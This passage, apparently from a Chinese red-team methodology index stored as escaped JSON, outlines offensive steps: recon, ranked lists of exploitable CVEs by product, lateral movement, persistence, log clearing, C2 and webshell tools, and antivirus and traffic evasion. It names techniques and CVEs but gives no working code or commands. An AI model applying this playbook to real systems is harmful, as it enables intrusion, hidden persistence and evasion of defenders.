\u8fdc\u7a0b\u521b\u5efa\u6267\u884c\u8ba1\u5212\u4efb\u52a1 [ Scheduled Tasks ] WMI \u8fdc\u7a0b\u6267\u884c [ WMI ] \u9488\u5bf9\u9ad8\u7248\u672cWindows \u7684WinRM \u8fdc\u7a0b\u6267\u884c DCOM \u8fdc\u7a0b\u6267\u884c [ \u9700\u8981\u76ee\u6807Windows\u673a\u5668\u4e8b\u5148\u5df2\u5173\u95ed\u9632\u706b\u5899 ] \u9ad8\u7248\u672c RDP \u8fdc\u7a0b\u6267\u884c \u5229\u7528MSSQL\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c \u5229\u7528Oracle\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c SMB [ PTH (hash\u4f20\u9012) ] RDP[MSTSC] \u53cd\u5411\u6e17\u900f [ \u5373\u53ef\u7528\u4e8e\u7a81\u7834\u67d0\u4e9b\u9694\u79bb, \u4ea6\u53ef\u901a\u8fc7\u4e91(Windows vps)\u76f4\u63a5\u53cd\u63a7\u76ee\u6807\u7ba1\u7406\u5458\u4e2a\u4eba\u673a CVE-2019-0887 ] \u5229\u7528\u8865\u4e01\u670d\u52a1\u5668\u4e0b\u53d1\u6267\u884c \u5229\u7528EDR\u4e3b\u63a7\u7aef\u5b9a\u5411\u4e0b\u53d1\u6267\u884c \u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux\u5e73\u53f0 plink \u6216\u8005 \u57fa\u4e8eWindows SSH\u5e93\u81ea\u884c\u5f00\u53d1\u5404\u79cd\u8fdc\u7a0b\u6267\u884c\u5c0f\u5de5\u5177 \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows \u5e73\u53f0 \u4e00\u822c\u90fd\u4f1a\u5c06 impacket\u5957\u4ef6\u4e2d\u7684\u5404\u4e2a\u5e38\u7528py\u811a\u672c\u4e8b\u5148\u76f4\u63a5\u6253\u5305\u6210\u53ef\u6267\u884c\u6587\u4ef6, \u7136\u540e\u4e22\u5230\u76ee\u6807linux\u7cfb\u7edf\u4e2d\u53bb\u6267\u884c,\u5982\u4e0b wmiexec_linux_x86_64 smbexec_linux_x86_64 psexec_linux_x86_64 atexec_linux_x86_64 dcomexec_linux_x86_64 \u53e6\u5916,\u8fd8\u6709\u4e00\u4e9b\u57fa\u4e8ego\u7684\u5de5\u5177,\u540c\u6837\u4e5f\u53ef\u4ee5\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6\u4e4b\u540e\u518d\u4e22\u4e0a\u53bb\u6267\u884c \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux \u5e73\u53f0 linux \u81ea\u5e26\u7684ssh\u5ba2\u6237\u7aef\u5de5\u5177\u5957\u4ef6, \u9ed8\u8ba4\u5c31\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c \u5404\u79cd\u8fdc\u7a0b\u4e0b\u8f7d\u6280\u5de7 wget [ win & linux ] curl [ win & linux ] \u4e4b\u6240\u4ee5\u6ca1\u7740\u91cd\u63d0\u4ee5\u4e0b\u8fd9\u4e9b\u7cfb\u7edf\u5185\u7f6e\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u5de5\u5177,\u4e3b\u8981\u8fd8\u662f\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u660e\u786e\u77e5\u9053 \u67d0\u4e9b\u6740\u8f6f\u73af\u5883\u4e0b\u5b83\u80af\u5b9a\u4f1a\u88ab\u62e6\u622a,\u6240\u4ee5\u4e8b\u5148\u5c31\u76f4\u63a5\u628a\u5b83\u5f03\u7528\u4e86,\u5c24\u5176\u9488\u5bf9\u7ea2\u961f\u8fd9\u79cd\u573a\u666f,\u8fd9\u4e9b\u4e1c\u897f\u6839\u672c\u4e0d\u5728\u4e4e\u591a,\u6709\u4e00\u4e2a\u80fd\u7528\u597d\u7528\u7684\u5373\u53ef CertUtil.exe Bitsadmin.exe Regsvr32.exe Rundll32.exe Powershell.exe ...... 0x11 \u5185\u7f51\u5b89\u5168 [ \u6743\u9650\u7ef4\u6301\uff0c\u9632\u5fa1\u91cd\u70b9 ] [ \u6ce8: \u6709\u4e9b\u7ec6\u8282\u6b64\u5904\u5e76\u672a\u5c55\u5f00\u8be6\u7ec6\u8bf4\u660e ] \u00b6 \u8fb9\u754c\u5165\u53e3\u6743\u9650\u7ef4\u6301 OWA \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,webshell ] VPN \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,shell ] \u5176\u4ed6 MAIL \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801 ] \u8fb9\u754c Web\u670d\u52a1\u5668 [ Webshell \u9a7b\u7559\u6280\u5de7 ] \u8fb9\u754c\u8def\u7531\u4ea4\u6362\u8bbe\u5907 [ \u8d26\u53f7\u5bc6\u7801,shell ] ... Windows \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 [ \u9ad8\u6743\u9650/\u4f4e\u6743\u9650 ] \u5e38\u89c4\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u9879 [ \u7528\u6237\u6743\u9650/system\u6743\u9650 ] Mssql\u5b58\u50a8\u8fc7\u7a0b [ \u7ee7\u627f\u670d\u52a1\u6743\u9650 ] WMI Winlogon CLR Logon Scripts MruPidlList Mof \u4f20\u7edf\u8fdc\u63a7 ... linux \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] Patch SSH \u66ff\u6362\u5404\u7c7b\u57fa\u7840\u670d\u52a1so [ PAM,Nginx,Rsync ...] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 \u4f20\u7edf\u5e94\u7528\u5c42\u8fdc\u63a7 \u9a71\u52a8\u5c42\u8fdc\u63a7( \u9488\u5bf9\u7279\u5b9a\u5185\u6838\u7248\u672c ) 0x12 \u75d5\u8ff9\u5904\u7406 \u00b6 web\u65e5\u5fd7 [ \u8bbf\u95ee, \u9519\u8bef\u65e5\u5fd7 ] \u6570\u636e\u5e93\u65e5\u5fd7 [ \u5f02\u5e38\u8fde\u63a5\u65e5\u5fd7,\u6162\u67e5\u8be2\u65e5\u5fd7 ] \u7cfb\u7edf\u5404\u7c7b\u5b89\u5168\u65e5\u5fd7 [ ssh,rdp,smb,wmi,powershell....] \u5404\u7c7b\u90ae\u7bb1\u767b\u5f55\u65e5\u5fd7 \u57df\u5185\u654f\u611f\u653b\u51fb\u5229\u7528\u65e5\u5fd7 [ \u91d1\u7968,\u94f6\u7968... ] \u6b64\u9879\u4e3a\u4e13\u4e1a\u84dd\u961f\u8303\u7574,\u4e0d\u518d\u8d58\u8ff0 ...... 0x13 \u5404\u7c7b\u5e38\u7528 C2 / \u6e17\u900f \u6846\u67b6 \u00b6 CobaltStrike [\u4e8c\u6b21\u5f00\u53d1] payload(beacon) \u9006\u5411/\u6539\u8fdb\u91cd\u5199 Metasploit [\u4e8c\u6b21\u5f00\u53d1] ...... 0x14 \u5404\u7c7b\u5e38\u7528 Webshell\u7ba1\u7406\u5de5\u5177 \u00b6 \u83dc\u5200 caidao20160622 \u51b0\u87f9 Behinder_v2.0.1 \u8681\u5251 AntSword ...... 0x15 \u514d\u6740 \u53ca \u5404\u7c7b\u9632\u706b\u5899\u5bf9\u6297 \u00b6 \u9759\u6001 \u6df7\u6dc6: \u624b\u5de5\u6df7\u6dc6,\u6709\u6e90\u7801\u7684\u60c5\u51b5\u4e0b,\u5c1d\u8bd5\u9010\u4e2a\u66ff\u6362\u53ef\u80fd\u662f\u5173\u952e\u7279\u5f81\u5b57\u7b26\u4e32\u7684 \u547d\u540d\u7a7a\u95f4\u540d, \u51fd\u6570\u540d, \u53d8\u91cf\u540d, \u5b57\u7b26\u4e32 \u7b49\u7b49\u7b49.... \u5de5\u5177\u6df7\u6dc6,\u9488\u5bf9\u5404\u79cd\u8bed\u8a00\u7684\u4e13\u4e1a\u6df7\u6dc6\u5de5\u5177 [ \u6709\u5546\u4e1a\u7248 ] ... \u52a0\u58f3: \u4e00\u4e9b\u5e38\u7528\u516c\u5f00\u58f3\u7684\u5b9e\u9645\u6548\u679c\u53ef\u80fd\u5e76\u4e0d\u662f\u592a\u597d [ \u4e5f\u6709\u5546\u4e1a\u58f3 ] \u6700\u597d\u7684\u65b9\u5f0f\u8fd8\u662f\u5c1d\u8bd5\u81ea\u5df1\u5199\u58f3,\u5c31\u662f\u6210\u672c\u8f83\u9ad8 ... \u52a8\u6001 \u53cd\u5c04 shellcode \u5185\u5b58\u52a0\u89e3\u5bc6\u6267\u884c ( \u5bf9\u4e8e\u73b0\u5728\u7684\u67d0\u4e9b\u6740\u8f6f\u6765\u8bb2,\u53ef\u80fd\u5e76\u6ca1\u4ec0\u4e48\u5375\u7528,\u522b\u4eba\u62e6\u7684\u57fa\u672c\u90fd\u662f\u4f60\u7684\u6700\u7ec8\u8c03\u7528 ) \u767d\u5229\u7528 ...... \u6ce8: \u7406\u8bba\u4e0a, \u8fd9\u4e9b\u5e94\u8be5\u4e5f\u6ca1\u6709\u4ec0\u4e48\u975e\u5e38\u901a\u7528\u7684\u65b9\u6cd5 \u5927\u591a\u8fd8\u662f\u4e8b\u5148\u9488\u5bf9\u7279\u5b9a\u7684\u6740\u8f6f\u9488\u5bf9\u6027\u7684\u4e0d\u505c\u8c03\u8bd5\u5206\u6790\u51fa\u5b83\u5230\u5e95\u600e\u4e48\u62e6,\u600e\u4e48\u67e5\u7684,\u7136\u540e\u518d\u9488\u5bf9\u6027\u7684\u5bf9\u75c7\u4e0b\u836f \u6d41\u91cf: \u57df\u524d\u7f6e[\u5229\u7528\u5927\u5382cdn] DNS\u52a0\u5bc6\u96a7\u9053 \u7b2c\u4e09\u65b9\u516c\u5171\u90ae\u7bb1\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u7f51\u76d8\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u793e\u4ea4\u7f51\u7ad9\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u533f\u540d\u793e\u4ea4\u5de5\u5177\u4e0a\u7ebf[eg: tg\u673a\u5668\u4eba,tor...] https://chaceshadow.github.io/","title":"\u76ee\u5f55"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x01","text":"\u7ed5CDN\u627e\u51fa\u76ee\u6807\u6240\u6709\u771f\u5b9eip\u6bb5 \u627e\u76ee\u6807\u7684\u5404\u79cdWeb\u7ba1\u7406\u540e\u53f0\u767b\u5f55\u53e3 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5 Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u771f\u5b9eC\u6bb5\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u626b\u63cf\u63a2\u6d4b\u8bc6\u522b \u5c1d\u8bd5\u76ee\u6807DNS\u662f\u5426\u5141\u8bb8\u533a\u57df\u4f20\u9001,\u5982\u679c\u4e0d\u5141\u8bb8\u5219\u7ee7\u7eed\u5c1d\u8bd5\u5b50\u57df\u7206\u7834 \u6279\u91cf\u6293\u53d6\u76ee\u6807\u6240\u6709\u5b50\u57df Web banner \u6279\u91cf\u5bf9\u76ee\u6807\u6240\u6709\u5b50\u57df\u96c6\u4e2d\u8fdb\u884c\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u63a2\u6d4b\u8bc6\u522b \u6279\u91cf\u8bc6\u522b\u76ee\u6807 \u6240\u6709\u5b58\u6d3bWeb\u7ad9\u70b9\u7684Web\u7a0b\u5e8f\u6307\u7eb9 \u53ca\u5176\u8be6\u7ec6\u7248\u672c \u4ece Git \u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801,\u5076\u5c14\u751a\u81f3\u8fd8\u80fd\u78b0\u5230\u76ee\u6807\u4e0d\u5c0f\u5fc3\u6cc4\u9732\u7684\u5404\u79cd\u4e91\u7684 \"AccessKey\" \u4ece\u7f51\u76d8/\u767e\u5ea6\u6587\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6\u53ca\u8d26\u53f7\u5bc6\u7801 \u4ece\u5404\u7b2c\u4e09\u65b9\u5386\u53f2\u6f0f\u6d1e\u5e93\u4e2d\u67e5\u627e\u76ee\u6807\u66fe\u7ecf\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u8d26\u53f7\u5bc6\u7801 [\u56fd\u5185\u76ee\u6807\u5f88\u597d\u4f7f] \u76ee\u6807Svn\u91cc\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6 \u7f51\u7ad9\u76ee\u5f55\u626b\u63cf [\u67e5\u627e\u76ee\u6807\u7f51\u7ad9\u6cc4\u9732\u7684\u5404\u7c7b\u654f\u611f\u6587\u4ef6, \u7f51\u7ad9\u5907\u4efd\u6587\u4ef6,\u654f\u611f\u914d\u7f6e\u6587\u4ef6, \u6e90\u7801 , \u522b\u4eba\u7684webshell, \u7b49\u7b49\u7b49...] \u76ee\u6807\u7ad9\u70b9\u81ea\u8eab\u5728\u524d\u7aef\u4ee3\u7801\u4e2d\u6cc4\u9732\u7684\u5404\u79cd\u654f\u611f\u4fe1\u606f fofa / shodan / bing / google hacking \u6df1\u5ea6\u5229\u7528 \u641c\u96c6\u76ee\u6807\u5b66\u751f\u5b66\u53f7 / \u5458\u5de5\u5de5\u53f7 / \u76ee\u6807\u90ae\u7bb1 [\u5e76\u987a\u624b\u5230\u5404\u4e2a\u793e\u5de5\u5e93\u4e2d\u53bb\u6279\u91cf\u67e5\u8be2\u8fd9\u4e9b\u90ae\u7bb1\u66fe\u7ecf\u662f\u5426\u6cc4\u9732\u8fc7\u5bc6\u7801 ] \u76ee\u6807\u81ea\u5df1\u5bf9\u5916\u63d0\u4f9b\u7684\u5404\u79cd \u6280\u672f\u6587\u6863 / wiki\u91cc\u6cc4\u9732\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\u53ca\u5176\u5b83\u654f\u611f\u4fe1\u606f \u76ee\u6807\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u5206\u6790\u76ee\u6807app Web\u8bf7\u6c42 \u501f\u52a9js\u63a2\u9488\u641c\u96c6\u76ee\u6807\u5185\u7f51\u4fe1\u606f \u60f3\u529e\u6cd5\u6df7\u5165\u76ee\u6807\u7684\u5404\u79cd \u5185\u90e8QQ\u7fa4 / \u5fae\u4fe1\u7fa4 \u5206\u6790\u76ee\u6807\u76f4\u63a5\u4f9b\u5e94\u5546 [\u5c24\u5176\u662f\u6280\u672f\u5916\u5305] \u6839\u636e\u524d\u9762\u5df2\u641c\u96c6\u5230\u7684\u5404\u7c7b\u4fe1\u606f\u5236\u4f5c\u6709\u9488\u5bf9\u6027\u7684\u5f31\u53e3\u4ee4\u5b57\u5178 \u76ee\u6807\u6240\u7528 Waf \u79cd\u7c7b\u8bc6\u522b \u4e0e \u7ed5\u8fc7 BypassWAF \u6587\u4ef6\u4e0a\u4f20 / \u8bfb\u53d6 / \u4e0b\u8f7d BypassWAF Sql\u6ce8\u5165 BypassWAF RCE BypassWAF \u5404\u7c7bJava Web\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 BypassWAF Webshell \u514d\u6740","title":"0x01 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u524d\u671f\u4fa6\u5bdf\uff0c\u641c\u96c6\u9636\u6bb5\u672c\u8eab\u5c31\u4e0d\u5b58\u5728\u592a\u591a\u53ef\u9632\u5fa1\u7684\u70b9\uff0c\u975e\u9632\u5fa1\u91cd\u5fc3]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x02","text":"\u6b64\u9636\u6bb5,\u4e3b\u8981\u662f\u9488\u5bf9\u5404\u4e3b\u6d41 \"\u4e2d\u95f4\u4ef6 + \u5f00\u6e90\u7a0b\u5e8f + Web\u670d\u52a1\u7ec4\u4ef6\" \u81ea\u8eab\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528\u5982\u4e0b\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f,\u7531\u4e8e\u5b8c\u5168\u4ee5\u5b9e\u6218\u5229\u7528\u4e3a\u5bfc\u5411,\u6545\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u76f8\u5bf9\u4f1a\u7ecf\u5e38\u9047\u5230\u7684,\u4e14\u5b9e\u6218\u4e2d\u786e\u5b9e\u80fd\u6709\u6548\u534f\u52a9\u5feb\u901fgetshell \u7684 \"\u4e2d\u95f4\u4ef6\" , \"\u5f00\u6e90\u7a0b\u5e8f\" \u53ca \"web\u7ec4\u4ef6\" \u9488\u5bf9\u5404\u7c7bJava\u4e2d\u95f4\u4ef6\u7684\u5404\u79cd\u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 \u4e0d\u540c\u4e8e\u5176\u5b83\u811a\u672c\u7c7bweb\u7a0b\u5e8f,Java\u7684\u8fd0\u884c\u6743\u9650\u901a\u5e38\u90fd\u6bd4\u8f83\u9ad8,\u751a\u81f3\u5927\u90e8\u5206\u90fd\u662f\u76f4\u63a5\u7528root/administrator/system\u6743\u9650\u5728\u8dd1,\u6240\u4ee5\u62ff\u5230\u7684shell\u6743\u9650\u4e00\u822c\u4e5f\u975e\u5e38\u9ad8,\u901a\u5e38\u90fd\u76f4\u63a5\u662f\u670d\u52a1\u5668\u6743\u9650,\u5c24\u5176\u662f\u5728\u5404\u79cd\u7ea2\u961f\u573a\u666f\u4e2d,\u5165\u4fb5\u8005\u4e00\u822c\u4e5f\u90fd\u4f1a\u9996\u9009\u8fd9\u4e9b\u70b9,\u5e76\u4ee5\u6b64\u4e3a\u7a81\u7834\u53e3\u6765\u83b7\u53d6\u4e00\u4e2a\u7a33\u5b9a\u7684\u8df3\u677f\u673a\u5165\u53e3\u6743\u9650,\u5173\u4e8e\u5230\u5e95\u54ea\u4e9b\u884c\u4e1a\u7279\u522b\u7231\u7528\u54ea\u4e9b\u4e2d\u95f4\u4ef6,\u8fd9\u4e9b\u4e5f\u5e94\u8be5\u90fd\u662f\u6709\u4e8b\u5148\u5206\u6790\u68b3\u7406\u6c47\u603b\u597d\u7684 Struts2 Struts2-005 Struts2-008 Struts2-009 Struts2-013 Struts2-016(\u5b9e\u9645\u4e0a,\u5f88\u591a\u90fd\u8001\u7cfb\u7edf\u90fd\u6f0f\u8865\u4e86\u8fd9\u4e2a\u6d1e,\u6210\u529f\u7387\u8f83\u9ad8) Struts2-019 Struts2-020 Struts2-devmode Struts2-032 Struts2-033 Struts2-037 Struts2-045 Struts2-046 Struts2-048 Struts2-052 Struts2-053 Struts2-057 weblogic CVE-2019-2725 CVE-2019-2729 CVE-2018-3191 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2017-3506 CVE-2017-10271 CVE-2017-3248 CVE-2016-0638 CVE-2016-3510 CVE-2015-4852 CVE-2014-4210 SSRF \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Jboss CVE-2015-7501 CVE-2017-7504 CVE-2017-12149 \u672a\u6388\u6743\u8bbf\u95ee,\u90e8\u7f72webshell \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell wildfly [ jboss 7.x \u6539\u540d\u4e3a wildfly ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Tomcat CVE-2016-8735 CVE-2017-12615 [ readonly \u5b9e\u9645\u8bbe\u4e3a true\u7684\u60c5\u51b5\u8f83\u5c11,\u7a0d\u9e21\u808b ] CVE-2020-1938 [ AJP\u534f\u8bae\u6f0f\u6d1e,\u76f4\u63a5\u628a8009\u7aef\u53e3\u66b4\u9732\u5728\u5916\u7f51\u7684\u4e0d\u592a\u591a,\u7a0d\u9e21\u808b ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshelll [ \u6ce8: 7.x\u7248\u672c\u540e,\u9ed8\u8ba4\u52a0\u4e86\u9632\u7206\u673a\u5236 ] Jekins CVE-2018-1999002 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u4efb\u610f\u547d\u4ee4\u6267\u884c \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u4efb\u610f\u547d\u4ee4\u6267\u884c ElasticSearch CVE-2014-3120 [\u4e13\u95e8\u9488\u5bf9\u8001\u7248\u672c(\u65e0\u6c99\u76d2)RCE] CVE-2015-1427 [Groovy RCE] CVE-2015-3337 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 RabbitMQ \u5f31\u53e3\u4ee4 Glassfish \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 [ \u4f4e\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell IBM Websphere Java \u53cd\u5e8f\u5217\u5316 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Axis2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u76ee\u5f55\u904d\u5386 Apache ActiveMQ \u672a\u6388\u6743\u8bbf\u95ee,5.12 \u4e4b\u524d\u7684\u7248\u672c fileserver\u5b58\u5728 PUT\u4efb\u610f\u5199 CVE-2015-5254 Apache Solr CVE-2017-12629 CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ] Apache Zookeeper \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 Apache Shiro\u53cd\u5e8f\u5217\u5316 fastjson <= 1.2.47 \u53cd\u5e8f\u5217\u5316\u5229\u7528 \u9488\u5bf9\u5404\u7c7bWindows php\u96c6\u6210\u73af\u5883 [ \u7531\u4e8e\u6b64\u7c7b\u73af\u5883\u62ff\u5230\u7684Webshell\u6743\u9650\u76f8\u5bf9\u8f83\u9ad8,\u6240\u4ee5,\u901a\u5e38\u4e5f\u662f\u7ea2\u961f\u4eba\u5458\u7684\u9996\u9009\u7a81\u7834\u53e3 ] AppServ Xampp \u5b9d\u5854 PhpStudy ...... \u9488\u5bf9\u5404\u7c7b\u5f00\u6e90\u7a0b\u5e8f\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 Dedecms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 thinkphp 5.x \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ecshop \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 Metinfo \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 discuz \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 \u5e1d\u56fdcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpmyadmin \u6570\u636e\u5e93\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 wordpress \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 joomla \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 drupal CVE-2018-7600 ,\u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ...... \u9488\u5bf9\u5176\u5b83\u5404\u7c7bWeb\u7ec4\u4ef6\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 IIS 6.0 RCE \u77ed\u6587\u4ef6\u6f0f\u6d1e PUT \u4efb\u610f\u5199 Webdav RCE CVE-2017-7269 \u7985\u9053\u9879\u76ee\u7ba1\u7406\u7cfb\u7edf SQL\u6ce8\u5165 \u6587\u4ef6\u8bfb\u53d6 \u8fdc\u7a0b\u6267\u884c \u901a\u8fbeOA SQL\u6ce8\u5165 \u4efb\u610f\u4e0a\u4f20 Exchange \u5229\u7528\u63a5\u53e3\u8fdb\u884c\u90ae\u7bb1\u7528\u6237\u540d\u679a\u4e3e \u9488\u5bf9\u5404\u4e2a\u63a5\u53e3\u7684\u5f31\u53e3\u4ee4\u7206\u7834 CVE-2020-0688 [ \u5229\u7528\u524d\u63d0\u662f\u9700\u8981\u5148\u5f97\u6709\u4efb\u610f\u4e00\u4e2a\u90ae\u7bb1\u7528\u6237\u6743\u9650 ] .... Zimbra [ XXE + SSRF => RCE ] CVE-2013-7091 CVE-2016-9924 CVE-2019-9670 Citrix CVE-2019-19781 Jumpserver \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 Zabbix CVE-2017-2824 SQL\u6ce8\u5165 [ 2.0 \u8001\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u654f\u611f\u673a\u5668\u4fe1\u606f\u6cc4\u9732 Cacti \u4f4e\u7248\u672c SQL\u6ce8\u5165 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Nagios CVE-2016-9565 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Webmin RCE CVE-2019-15107 PHPMailer CVE-2016-10033 \u6cdb\u5faeOA\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u91d1\u8776OA SQL\u6ce8\u5165 Coremail \u654f\u611f\u6587\u4ef6\u6cc4\u9732 UEditor \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 OpenSSL\u5fc3\u810f\u6ef4\u8840\u6293\u660e\u6587\u8d26\u53f7\u5bc6\u7801 [ Heartbleed ] \u7834\u58f3\u6f0f\u6d1e [ Shellshock ] \u5404\u79cd\u80fd\u5feb\u901fgetshell\u7684\u5e38\u89c4\u57fa\u7840Web\u6f0f\u6d1e\u5229\u7528 [ \u6ce8: \u6709\u4e9b\u6f0f\u6d1e\u5728\u4e0d\u5ba1\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u5176\u5b9e\u662f\u5f88\u96be\u6709\u6548\u76f2\u6d4b\u5230\u7684 ] \u540e\u53f0\u5f31\u53e3\u4ee4 SSRF sql\u6ce8\u5165 \u8d8a\u6743 \u547d\u4ee4 / \u4ee3\u7801\u6267\u884c / \u53cd\u5e8f\u5217\u5316 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 / \u4e0b\u8f7d / \u8bfb\u53d6 \u5305\u542b XSS\uff08\u5b9e\u9645\u4e0a,XSS\u53ea\u6709\u5728\u9488\u5bf9\u67d0\u4e9b\u7279\u5b9a\u90ae\u7bb1,\u624b\u91cc\u6709\u6d4f\u89c8\u56680day\u65f6\u4ef7\u503c\u624d\u4f1a\u6bd4\u8f83\u5927,\u7ea2\u961f\u573a\u666f\u4e0b\u5176\u5b9e\u5e76\u4e0d\u662f\u975e\u5e38\u81f4\u547d) \u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e \u9488\u5bf9\u5404\u7c7b\u8fb9\u754c\u7f51\u7edc\u8bbe\u5907\u7684\u5404\u79cd\u5229\u7528,\u4e3b\u8981\u662fWeb\u7ba1\u7406\u63a7\u5236\u53f0\u767b\u5f55\u5f31\u53e3\u4ee4\u53ca \u5404\u7c7b\u5df2\u77e5nday\u653b\u51fb\u5229\u7528 Pulse Secure VPN CVE-2019-11510 [ \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 ] Fortinet VPN CVE-2018-13379 [ \u6587\u4ef6\u8bfb\u53d6 ] Sangfor Vpn RCE","title":"0x02 \u5165\u53e3\u6743\u9650\u83b7\u53d6[ \u5916\u90e8\u9632\u5fa1\u91cd\u5fc3 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x03-getshell","text":"\u6b64\u5904\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u5b9e\u6218\u4e2d\u771f\u6b63\u80fd\u534f\u52a9\u5feb\u901fgetshell\u7684\u670d\u52a1,\u5176\u5b83\u7684\u4e00\u4e9b\u76f8\u5bf9\u8fb9\u7f18\u6027\u7684\u670d\u52a1\u5747\u672a\u63d0\u53ca,\u540c\u6837,\u5df2\u6309 